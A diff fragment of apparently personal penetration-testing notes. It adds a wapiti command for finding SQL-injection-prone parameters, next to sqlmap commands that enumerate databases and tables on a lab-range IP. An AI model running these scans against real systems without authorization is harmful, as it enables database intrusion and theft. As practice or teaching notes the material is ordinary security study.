@@ -163,7 +163,7 @@ to exploit try this way
 
 SQL: 
 Sqli 
-
+---> to find vul parameters: wapiti -u <url> -m sql  This Will give the vulnerable parameter [in sudo]
 -> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs 
 -> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
 -tables
